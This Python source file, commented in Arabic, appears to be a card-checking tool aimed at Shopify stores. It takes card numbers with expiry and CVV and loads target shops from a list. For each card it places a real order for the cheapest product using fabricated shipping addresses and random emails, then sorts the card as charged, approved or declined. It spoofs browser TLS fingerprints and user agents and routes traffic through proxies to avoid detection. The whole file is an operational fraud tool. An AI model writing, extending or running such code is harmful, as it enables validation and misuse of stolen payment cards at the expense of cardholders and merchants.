import json
import random
import re
import time
import time as _time
import threading
import html
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import sys
import os
from datetime import datetime

import asyncio
import hashlib
from pathlib import Path

from curl_cffi import requests
from curl_cffi.requests import Session, BrowserType

# ──────────────────────── config ─────────────────────────────────────

SITE_TXT = Path(__file__).parent / "site.txt"

BROWSER_PROFILES = ["chrome124", "chrome120", "chrome116", "edge101", "safari15_5", "firefox133"]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 Edg/123.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

# ──────────────────────── متغيرات الكاش للـ 429 ────────────────────

_site_429_cache = {}
_site_429_cache_lock = threading.Lock()
_SITE_429_TTL = 1800  # 30 دقيقة

# ──────────────────────── Enums / Result types ───────────────────────

class CheckStatus(Enum):
    CHARGED  = 0
    APPROVED = 1
    DECLINED = 2
    ERROR    = 3

@dataclass
class CheckResult:
    card: str
    status: CheckStatus
    status_code: str = ""
    amount: str = ""
    currency: str = ""
    site_name: str = ""
    shop_url: str = ""
    receipt_url: str = ""
    error: Exception = None
    retryable: bool = False

# ──────────────────────── Data models ────────────────────────────────

@dataclass
class Variant:
    id: int
    title: str
    price: str
    available: bool

@dataclass
class Product:
    id: int
    title: str
    variants: List[Variant]

@dataclass
class Address:
    first_name: str
    last_name: str
    address1: str
    address2: str
    city: str
    country_code: str
    zone_code: str
    postal_code: str
    phone: str
    email_domain: str = "gmail.com"

# ──────────────────────── Address database ───────────────────────────

COUNTRY_ADDRESSES: Dict[str, Address] = {
    "US": Address("james",   "anderson",  "428 W 45th St",          "Apt 4B",    "New York",      "US", "NY",  "10036", "+12125550100", "gmail.com"),
    "US-CA": Address("michael","johnson", "123 Hollywood Blvd",     "Suite 100", "Los Angeles",   "US", "CA",  "90028", "+13235550100", "yahoo.com"),
    "US-TX": Address("robert","williams", "456 Main St",            "",          "Houston",       "US", "TX",  "77002", "+17135550100", "outlook.com"),
    "US-FL": Address("david", "brown",    "789 Ocean Dr",           "Apt 12",    "Miami",         "US", "FL",  "33139", "+13055550100", "hotmail.com"),
    "CA":    Address("john",  "smith",    "200 Kent St",            "",          "Ottawa",        "CA", "ON",  "K1A 0G9", "+16135550100", "gmail.com"),
    "CA-BC": Address("william","davis",   "789 Granville St",       "Floor 5",   "Vancouver",     "CA", "BC",  "V6Z 1K9", "+16045550100", "gmail.com"),
    "GB":    Address("james", "wilson",   "10 Downing St",          "",          "London",        "GB", "ENG", "SW1A 2AA", "+442012345678", "gmail.com"),
    "IN":    Address("rohan", "singh",    "Sachin Sweets Corner Nandgram Ghukna", "", "Ghaziabad", "IN", "UP", "201003", "8826800450", "gmail.com"),
    "GB-MAN":Address("oliver","martinez","123 Deansgate",           "Apt 3B",    "Manchester",    "GB", "ENG", "M3 4BQ",   "+441619876543", "outlook.com"),
    "AU":    Address("thomas","taylor",   "1 George St",            "",          "Sydney",        "AU", "NSW", "2000",    "+61212345678",  "gmail.com"),
    "AU-MEL":Address("daniel","anderson", "100 Collins St",         "Level 10",  "Melbourne",     "AU", "VIC", "3000",    "+61398765432",  "yahoo.com"),
    "DE":    Address("lucas", "thomas",   "Friedrichstr 100",       "",          "Berlin",        "DE", "BE",  "10117",   "+493012345678", "gmail.com"),
    "DE-MUC":Address("felix", "schmidt",  "Marienplatz 1",          "",          "Munich",        "DE", "BY",  "80331",   "+49891234567",  "gmail.com"),
    "FR":    Address("hugo",  "bernard",  "10 Rue de Rivoli",       "",          "Paris",         "FR", "IDF", "75001",   "+33112345678",  "gmail.com"),
    "FR-LY": Address("louis", "petit",    "15 Rue de la République","",          "Lyon",          "FR", "ARA", "69001",   "+33487654321",  "outlook.com"),
    "NZ":    Address("jack",  "wilson",   "1 Queen St",             "",          "Auckland",      "NZ", "AUK", "1010",    "+6491234567",   "gmail.com"),
    "NZ-WLG":Address("liam",  "brown",    "100 Willis St",          "Floor 2",   "Wellington",    "NZ", "WGN", "6011",    "+6449876543",   "gmail.com"),
    "IE":    Address("sean",  "murphy",   "1 Grafton St",           "",          "Dublin",        "IE", "D",   "D02 Y006","+35311234567",  "gmail.com"),
    "IE-CORK":Address("patrick","kelly",  "100 Patrick St",         "",          "Cork",          "IE", "CO",  "T12 XY88","+35321456789",  "gmail.com"),
    "NL":    Address("bas",   "jansen",   "Dam 1",                  "",          "Amsterdam",     "NL", "NH",  "1012 JS", "+31201234567",  "gmail.com"),
    "ES":    Address("carlos","garcia",   "Calle Mayor 1",          "",          "Madrid",        "ES", "M",   "28013",   "+34912345678",  "gmail.com"),
    "IT":    Address("marco", "rossi",    "Via Roma 1",             "",          "Rome",          "IT", "RM",  "00184",   "+39061234567",  "gmail.com"),
    "SE":    Address("erik",  "andersson","Vasagatan 1",            "",          "Stockholm",     "SE", "AB",  "111 20",  "+468123456",    "gmail.com"),
    "NO":    Address("olav",  "hansen",   "Karl Johans gate 1",     "",          "Oslo",          "NO", "03",  "0154",    "+4721234567",   "gmail.com"),
    "DK":    Address("lars",  "nielsen",  "Strøget 1",              "",          "Copenhagen",    "DK", "84",  "1457",    "+4531234567",   "gmail.com"),
    "FI":    Address("jussi", "korhonen", "Mannerheimintie 1",      "",          "Helsinki",      "FI", "18",  "00100",   "+35891234567",  "gmail.com"),
    "BE":    Address("jan",   "peeters",  "Grote Markt 1",          "",          "Brussels",      "BE", "BRU", "1000",    "+3221234567",   "gmail.com"),
    "CH":    Address("hans",  "weber",    "Bahnhofstrasse 1",       "",          "Zurich",        "CH", "ZH",  "8001",    "+41441234567",  "gmail.com"),
    "AT":    Address("markus","gruber",   "Stephansplatz 1",        "",          "Vienna",        "AT", "9",   "1010",    "+4312345678",   "gmail.com"),
    "JP":    Address("takashi","yamamoto","1-1-1 Marunouchi",       "",          "Tokyo",         "JP", "13",  "100-0005","+81312345678",  "gmail.com"),
    "SG":    Address("wei",   "tan",      "1 Raffles Place",        "#01-01",    "Singapore",     "SG", "01",  "048616",  "+6561234567",   "gmail.com"),
    "AE":    Address("ahmed", "al-mansouri","Sheikh Zayed Road 1",  "",          "Dubai",         "AE", "DU",  "12345",   "+97141234567",  "gmail.com"),
}

# Fallback order when US shipping is rejected
SHIPPING_FALLBACK_ORDER = ["CA", "GB", "AU", "DE", "FR", "NL", "IE", "SE", "NO", "DK"]

EMAIL_DOMAINS  = ["gmail.com","yahoo.com","outlook.com","hotmail.com","protonmail.com","icloud.com","aol.com","mail.com","yandex.com","proton.me"]
FIRST_NAMES    = ["james","john","robert","michael","william","david","richard","joseph","thomas","charles","mary","patricia","jennifer","linda","elizabeth","barbara","susan","jessica","sarah","karen"]
LAST_NAMES     = ["smith","johnson","williams","brown","jones","garcia","miller","davis","rodriguez","martinez","anderson","taylor","thomas","moore","jackson","martin","lee","white","harris","clark"]

def generate_random_email() -> str:
    name = random.choice(FIRST_NAMES) + random.choice(LAST_NAMES) + str(random.randint(1, 999))
    return f"{name}@{random.choice(EMAIL_DOMAINS)}"

def address_for_country(country: str) -> Address:
    if country in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[country]
    base = country[:2] if len(country) > 2 else country
    if base in COUNTRY_ADDRESSES:
        return COUNTRY_ADDRESSES[base]
    return COUNTRY_ADDRESSES["US"]

def get_fallback_addresses(exclude_country: str = "US") -> List[Address]:
    result = []
    for code in SHIPPING_FALLBACK_ORDER:
        if code.upper() != exclude_country.upper() and code in COUNTRY_ADDRESSES:
            result.append(COUNTRY_ADDRESSES[code])
    return result

# ──────────────────────── TLS Client ─────────────────────────────────

class TLSClient:
    def __init__(self, timeout=12, proxy_url=None, impersonate=None, user_agent=None):
        self.timeout = timeout
        if impersonate is None:
            impersonate = random.choice(BROWSER_PROFILES)
        if user_agent is None:
            user_agent = random.choice(USER_AGENTS)
        self.impersonate = impersonate
        self.user_agent  = user_agent
        self.session     = Session(impersonate=impersonate, timeout=timeout)
        self.session.headers.update({
            'User-Agent':              user_agent,
            'Accept-Language':         'en-US,en;q=0.9',
            'Accept-Encoding':         'gzip, deflate, br',
            'Accept':                  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Connection':              'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest':          'document',
            'Sec-Fetch-Mode':          'navigate',
            'Sec-Fetch-Site':          'none',
            'Sec-Fetch-User':          '?1',
            'Cache-Control':           'max-age=0',
        })
        if proxy_url:
            self.session.proxies = {'http': proxy_url, 'https': proxy_url}

    def get(self, url, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.get(url, **kwargs)

    def post(self, url, data=None, json=None, **kwargs):
        kwargs.setdefault('timeout', self.timeout)
        return self.session.post(url, data=data, json=json, **kwargs)

    def close(self):
        self.session.close()

    def __enter__(self):
        return self

    def __exit__(self, *args):
        self.close()

# ──────────────────────── Site loader ────────────────────────────────

def load_sites_from_file(path: Path) -> List[str]:
    try:
        with open(path, "r", encoding="utf-8") as f:
            lines = f.read().splitlines()
    except FileNotFoundError:
        return []
    
    sites = []
    for raw in lines:
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        if not line.startswith(("http://", "https://")):
            line = "https://" + line
        sites.append(line.rstrip("/"))
    return sites

def get_random_site() -> Optional[str]:
    sites = load_sites_from_file(SITE_TXT)
    if not sites:
        return None
    return random.choice(sites)

def get_all_sites() -> List[str]:
    return load_sites_from_file(SITE_TXT)

# ──────────────────────── Product cache ──────────────────────────────

_product_cache: Dict[str, tuple] = {}
_product_cache_lock = threading.Lock()
_PRODUCT_CACHE_TTL  = 7200  # ساعتين

# ──────────────────────── Find product (fast) ────────────────────────

def find_cheapest_product_fast(client: TLSClient, shop_url: str, min_price: float = 0.50) -> Tuple[str, str, str, str]:
    """
    جيب المنتج بسرعة من /collections/all/products.json أو /products.json
    """
    # ===== 1. جرب من الكاش =====
    now = _time.time()
    with _product_cache_lock:
        cached = _product_cache.get(shop_url)
        if cached and now - cached[-1] < _PRODUCT_CACHE_TTL:
            return cached[:-1]
    
    # ===== 2. جرب /collections/all/products.json (أسرع) =====
    try:
        resp = client.get(f"{shop_url}/collections/all/products.json?limit=5")
        if resp.status_code == 200:
            data = resp.json()
            for p in data.get('products', []):
                for v in p.get('variants', []):
                    if v.get('available', False):
                        price = float(v.get('price', 0))
                        if price >= min_price:
                            result = (p.get('title', ''), str(p.get('id', '')), str(v.get('id', '')), v.get('price', '0'))
                            with _product_cache_lock:
                                _product_cache[shop_url] = (*result, _time.time())
                            return result
    except:
        pass
    
    # ===== 3. جرب /products.json =====
    try:
        resp = client.get(f"{shop_url}/products.json?limit=5&page=1")
        if resp.status_code == 200:
            data = resp.json()
            for p in data.get('products', []):
                for v in p.get('variants', []):
                    if v.get('available', False):
                        price = float(v.get('price', 0))
                        if price >= min_price:
                            result = (p.get('title', ''), str(p.get('id', '')), str(v.get('id', '')), v.get('price', '0'))
                            with _product_cache_lock:
                                _product_cache[shop_url] = (*result, _time.time())
                            return result
    except:
        pass
    
    # ===== 4. جرب /collections/all (HTML - أبطأ) =====
    try:
        resp = client.get(f"{shop_url}/collections/all")
        if resp.status_code == 200:
            html_content = resp.text
            product_links = re.findall(r'href="([^"]*\/products\/[^"]+)"', html_content)
            if product_links:
                link = product_links[0]
                if not link.startswith('http'):
                    link = shop_url + link
                resp = client.get(link)
                if resp.status_code == 200:
                    html_content = resp.text
                    variant_match = re.search(r'"id"\s*:\s*"gid://shopify/ProductVariant/(\d+)"', html_content)
                    if not variant_match:
                        variant_match = re.search(r'data-variant-id="(\d+)"', html_content)
                    if variant_match:
                        variant_id = variant_match.group(1)
                        price_match = re.search(r'"price"\s*:\s*"([0-9.]+)"', html_content)
                        if price_match:
                            price = float(price_match.group(1))
                            if price >= min_price:
                                product_match = re.search(r'"id"\s*:\s*"gid://shopify/Product/(\d+)"', html_content)
                                product_id = product_match.group(1) if product_match else ""
                                title_match = re.search(r'"title"\s*:\s*"([^"]+)"', html_content)
                                title = title_match.group(1) if title_match else "Product"
                                result = (title, product_id, variant_id, str(price))
                                with _product_cache_lock:
                                    _product_cache[shop_url] = (*result, _time.time())
                                return result
    except:
        pass
    
    raise Exception(f"No available products above ${min_price:.2f} at {shop_url}")

# ──────────────────────── Get cart token ─────────────────────────────

def get_cart_token(client: TLSClient, shop_url: str) -> str:
    """جيب cart_token من /cart.js"""
    try:
        resp = client.get(f"{shop_url}/cart.js")
        if resp.status_code == 200:
            data = resp.json()
            return data.get('token', '')
    except:
        pass
    return ""

def add_to_cart_js(client: TLSClient, shop_url: str, variant_id: str) -> bool:
    """أضف المنتج للعربة باستخدام /cart/add.js"""
    try:
        headers = {
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {'id': variant_id, 'quantity': 1, 'form_type': 'product', 'utf8': '✓'}
        resp = client.post(f"{shop_url}/cart/add.js", data=data, headers=headers)
        if resp.status_code == 200:
            return True
    except:
        pass
    return False

# ──────────────────────── Start checkout ─────────────────────────────

def start_checkout_fast(client: TLSClient, shop_url: str, cart_token: str = "") -> Tuple[str, str, str, str]:
    """ابدأ الـ Checkout بسرعة"""
    url = f"{shop_url}/cart"
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'cache-control': 'max-age=0',
        'origin': shop_url,
        'referer': f"{shop_url}/cart",
        'upgrade-insecure-requests': '1',
    }
    data = f'updates%5B%5D=1&checkout=&cart_token={cart_token or ""}'
    resp = client.post(url, data=data, headers=headers, allow_redirects=True)
    
    checkout_url = resp.url
    checkout_html = resp.text
    
    # استخرج checkout_id
    token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
    checkout_token = token_match.group(1) if token_match else ""
    
    # استخرج session_token
    session_match = re.search(r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"', checkout_html)
    if not session_match:
        session_match = re.search(r'"sessionToken"\s*:\s*"(AAEB[^"]+)"', checkout_html)
    session_token = session_match.group(1) if session_match else ""
    
    return checkout_url, checkout_token, session_token, checkout_html

# ──────────────────────── PCI Tokenization ───────────────────────────

def vault_card(client: TLSClient, card_number: str, month: str, year: str, cvv: str, 
               name: str, signature: str = "", shop_domain: str = "") -> Optional[str]:
    """Tokenize الكارت باستخدام Shopify PCI"""
    try:
        url = "https://checkout.pci.shopifyinc.com/sessions"
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': 'https://checkout.pci.shopifyinc.com',
            'referer': 'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html',
            'user-agent': random.choice(USER_AGENTS),
        }
        if signature:
            headers['shopify-identification-signature'] = signature
        
        payload = {
            "credit_card": {
                "number": card_number,
                "month": int(month),
                "year": int(year),
                "verification_value": cvv,
                "start_month": None,
                "start_year": None,
                "issue_number": "",
                "name": name,
            },
            "payment_session_scope": shop_domain or "shopify.com"
        }
        
        resp = client.post(url, json=payload, headers=headers)
        if resp.status_code in (200, 201):
            data = resp.json()
            return data.get('id')
    except:
        pass
    return None

# ──────────────────────── Submit for completion ──────────────────────

def submit_for_completion(client: TLSClient, shop_url: str, checkout_url: str, 
                          checkout_token: str, session_token: str, stable_id: str,
                          queue_token: str, variant_id: str, vault_id: str,
                          address: Address, email: str) -> Optional[str]:
    """Submit الـ Checkout"""
    try:
        url = f"{shop_url}/checkouts/unstable/graphql"
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': shop_url,
            'referer': checkout_url,
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
            'x-checkout-one-session-token': session_token,
            'x-checkout-web-deploy-stage': 'production',
            'x-checkout-web-server-handling': 'fast',
            'x-checkout-web-server-rendering': 'yes',
            'x-checkout-web-source-id': checkout_token,
            'user-agent': random.choice(USER_AGENTS),
        }
        
        attempt_token = f"{checkout_token}-{''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))}"
        
        mutation = """
        mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!) {
          submitForCompletion(input:$input attemptToken:$attemptToken) {
            ...on SubmitSuccess { receipt { id __typename } __typename }
            ...on SubmitAlreadyAccepted { receipt { id __typename } __typename }
            ...on SubmitFailed { reason __typename }
            ...on SubmitRejected { errors { code localizedMessage __typename } __typename }
            ...on Throttled { pollAfter queueToken __typename }
            ...on CheckpointDenied { redirectUrl __typename }
            ...on SubmittedForCompletion { receipt { id __typename } __typename }
          }
        }
        """
        
        payload = {
            "query": mutation,
            "operationName": "SubmitForCompletion",
            "variables": {
                "attemptToken": attempt_token,
                "input": {
                    "sessionInput": {"sessionToken": session_token},
                    "queueToken": queue_token,
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": address.address1,
                                    "address2": address.address2,
                                    "city": address.city,
                                    "countryCode": address.country_code,
                                    "postalCode": address.postal_code,
                                    "firstName": address.first_name,
                                    "lastName": address.last_name,
                                    "zoneCode": address.zone_code,
                                    "phone": address.phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True}
                                },
                                "options": {}
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "supportsSplitShipping": True
                    },
                    "deliveryExpectations": {"deliveryExpectationLines": []},
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stable_id,
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{variant_id}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"any": True}
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": "",
                                    "sessionId": vault_id,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": address.address1,
                                            "address2": address.address2,
                                            "city": address.city,
                                            "countryCode": address.country_code,
                                            "postalCode": address.postal_code,
                                            "firstName": address.first_name,
                                            "lastName": address.last_name,
                                            "zoneCode": address.zone_code,
                                            "phone": address.phone,
                                        }
                                    }
                                }
                            },
                            "amount": {"any": True}
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": address.address1,
                                "address2": address.address2,
                                "city": address.city,
                                "countryCode": address.country_code,
                                "postalCode": address.postal_code,
                                "firstName": address.first_name,
                                "lastName": address.last_name,
                                "zoneCode": address.zone_code,
                                "phone": address.phone,
                            }
                        }
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": "USD", "countryCode": address.country_code},
                        "email": email,
                        "emailChanged": False,
                        "phoneCountryCode": address.country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": address.country_code},
                        "rememberMe": False
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"any": True}
                    },
                    "note": {"message": None, "customAttributes": []}
                }
            }
        }
        
        resp = client.post(url, json=payload, headers=headers)
        if resp.status_code == 200:
            data = resp.json()
            submit = data.get('data', {}).get('submitForCompletion', {})
            receipt = submit.get('receipt', {})
            return receipt.get('id')
    except:
        pass
    return None

# ──────────────────────── Poll for receipt ──────────────────────────

def poll_for_receipt(client: TLSClient, shop_url: str, checkout_url: str,
                     checkout_token: str, session_token: str, receipt_id: str) -> Tuple[str, str]:
    """تابع الـ Order"""
    try:
        url = f"{shop_url}/checkouts/unstable/graphql"
        
        headers = {
            'accept': 'application/json',
            'content-type': 'application/json',
            'referer': checkout_url,
            'shopify-checkout-client': 'checkout-web/1.0',
            'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
            'x-checkout-one-session-token': session_token,
            'x-checkout-web-source-id': checkout_token,
            'user-agent': random.choice(USER_AGENTS),
        }
        
        query = """
        query PollForReceipt($receiptId:ID!,$sessionToken:String!) {
          receipt(receiptId:$receiptId, sessionInput:{sessionToken:$sessionToken}) {
            __typename
            ...on ProcessedReceipt { id token __typename }
            ...on ProcessingReceipt { id pollDelay __typename }
            ...on ActionRequiredReceipt { id __typename }
            ...on FailedReceipt { id processingError { code messageUntranslated __typename } __typename }
          }
        }
        """
        
        for attempt in range(10):
            payload = {
                "query": query,
                "operationName": "PollForReceipt",
                "variables": {
                    "receiptId": receipt_id,
                    "sessionToken": session_token
                }
            }
            
            resp = client.post(url, json=payload, headers=headers)
            if resp.status_code == 200:
                data = resp.json()
                receipt = data.get('data', {}).get('receipt', {})
                typename = receipt.get('__typename', '')
                
                if typename == 'ProcessedReceipt':
                    return ('CHARGED', 'ORDER_PLACED')
                elif typename == 'ActionRequiredReceipt':
                    return ('APPROVED', '3DS_AUTHENTICATION')
                elif typename == 'FailedReceipt':
                    error = receipt.get('processingError', {})
                    code = error.get('code', 'UNKNOWN')
                    return ('DECLINED', code)
                elif typename in ('ProcessingReceipt', 'WaitingReceipt'):
                    time.sleep(2)
                    continue
            
            time.sleep(1)
    except:
        pass
    
    return ('ERROR', 'POLL_TIMEOUT')

# ──────────────────────── Main checkout function ────────────────────

def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "") -> CheckResult:
    """الوظيفة الرئيسية للشيك"""
    
    if not shop_url:
        shop_url = get_random_site()
        if not shop_url:
            result = CheckResult(card=card_entry, shop_url="", site_name="", currency="USD", status=CheckStatus.ERROR)
            result.error = Exception("No sites available")
            return result
    
    currency = "USD"
    country = "US"
    site_name = shop_url.replace("https://", "").replace("http://", "")
    
    result = CheckResult(card=card_entry, shop_url=shop_url, site_name=site_name, currency=currency, status=CheckStatus.ERROR)
    
    try:
        card_number, card_month, card_year, card_cvv = parse_card_entry(card_entry)
    except Exception as e:
        result.error = e
        return result
    
    email = generate_random_email()
    impersonate = random.choice(BROWSER_PROFILES)
    user_agent = random.choice(USER_AGENTS)
    
    client = TLSClient(timeout=12, proxy_url=proxy_url, impersonate=impersonate, user_agent=user_agent)
    
    try:
        # ===== Step 1: جيب المنتج بسرعة =====
        try:
            title, product_id, variant_id, price = find_cheapest_product_fast(client, shop_url)
            _ = title, product_id
        except Exception as e:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception(f"Step 0 failed: {e}")
            return result
        
        # ===== Step 2: جيب cart_token =====
        cart_token = get_cart_token(client, shop_url)
        
        # ===== Step 3: أضف للعربة =====
        if not add_to_cart_js(client, shop_url, variant_id):
            # حاول بالطريقة القديمة
            checkout_url, checkout_token, session_token, checkout_html = add_to_cart_and_checkout_old(client, shop_url, variant_id)
            if not checkout_url:
                result.status = CheckStatus.ERROR
                result.retryable = True
                result.error = Exception("Failed to add to cart")
                return result
        else:
            # ===== Step 4: ابدأ الـ Checkout =====
            checkout_url, checkout_token, session_token, checkout_html = start_checkout_fast(client, shop_url, cart_token)
        
        if not checkout_url or not session_token:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception("Failed to start checkout")
            return result
        
        # ===== Step 5: استخرج التوكنات =====
        stable_id = extract_stable_id(checkout_html)
        queue_token = extract_queue_token_from_html(checkout_html)
        signature = extract_identification_signature(checkout_html)
        build_id = extract_commit_sha(checkout_html)
        source_token = extract_source_token(checkout_html)
        
        if not stable_id:
            stable_id = str(uuid.uuid4())
        
        # ===== Step 6: Tokenize الكارت =====
        address = address_for_country(country)
        name = f"{address.first_name} {address.last_name}"
        shop_domain = urllib.parse.urlparse(shop_url).netloc
        
        vault_id = vault_card(client, card_number, card_month, card_year, card_cvv, name, signature, shop_domain)
        if not vault_id:
            result.status = CheckStatus.ERROR
            result.retryable = True
            result.error = Exception("Card vault failed")
            return result
        
        # ===== Step 7: Submit =====
        receipt_id = submit_for_completion(client, shop_url, checkout_url, checkout_token,
                                           session_token, stable_id, queue_token,
                                           variant_id, vault_id, address, email)
        
        if not receipt_id:
            result.status = CheckStatus.DECLINED
            result.error = Exception("Submission rejected")
            return result
        
        # ===== Step 8: Poll للـ receipt =====
        status, status_code = poll_for_receipt(client, shop_url, checkout_url, checkout_token,
                                                session_token, receipt_id)
        
        if status == 'CHARGED':
            result.status = CheckStatus.CHARGED
            result.status_code = "ORDER_PLACED"
            result.amount = price
            result.receipt_url = checkout_url + "/thank_you"
        elif status == 'APPROVED':
            result.status = CheckStatus.APPROVED
            result.status_code = "3DS_AUTHENTICATION"
            result.amount = price
        elif status == 'DECLINED':
            result.status = CheckStatus.DECLINED
            result.status_code = status_code
            result.error = Exception(status_code)
        else:
            result.status = CheckStatus.ERROR
            result.error = Exception(status_code)
        
        return result
        
    finally:
        client.close()

# ──────────────────────── Helper functions ──────────────────────────

def add_to_cart_and_checkout_old(client: TLSClient, shop_url: str, variant_id: str) -> Tuple[str, str, str, str]:
    """الطريقة القديمة لإضافة المنتج للعربة"""
    try:
        cart_permalink = f"{shop_url}/cart/{variant_id}:1"
        resp = client.get(cart_permalink, allow_redirects=True)
        if resp.status_code not in (200, 302):
            return "", "", "", ""
        
        checkout_url = resp.url
        checkout_html = resp.text
        
        token_match = re.search(r'/checkouts/cn/([^/?]+)', checkout_url)
        checkout_token = token_match.group(1) if token_match else ""
        
        session_match = re.search(r'<meta\s+name="serialized-sessionToken"\s+content="([^"]*)"', checkout_html)
        session_token = html.unescape(session_match.group(1)).strip('"') if session_match else ""
        
        return checkout_url, checkout_token, session_token, checkout_html
    except:
        return "", "", "", ""

def extract_queue_token_from_html(html_content: str) -> str:
    match = re.search(r'queueToken&quot;:&quot;([^&]+)&quot;', html_content)
    if not match:
        match = re.search(r'"queueToken"\s*:\s*"([^"]+)"', html_content)
    return match.group(1) if match else ""

def extract_stable_id(html_content: str) -> str:
    match = re.search(r'"stableId"\s*:\s*"([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})"', html_content)
    return match.group(1) if match else ""

def extract_identification_signature(html_content: str) -> str:
    match = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', html_content)
    return match.group(1) if match else ""

def extract_commit_sha(html_content: str) -> str:
    match = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', html_content)
    return match.group(1) if match else ""

def extract_source_token(html_content: str) -> str:
    match = re.search(r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"', html_content)
    return html.unescape(match.group(1)).strip('"') if match else ""

def parse_card_entry(card_entry: str) -> Tuple[str, str, str, str]:
    parts = card_entry.strip().split('|')
    if len(parts) != 4:
        raise Exception("Invalid card format")
    return parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()

def normalize_proxy(raw: str) -> str:
    p = raw.strip()
    if not p:
        raise Exception("empty proxy")
    
    if '://' not in p:
        parts = p.split(':')
        if len(parts) == 4:
            p = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        else:
            p = "http://" + p
    
    parsed = urllib.parse.urlparse(p)
    if not parsed.netloc:
        raise Exception(f"invalid proxy format: {raw}")
    
    return p
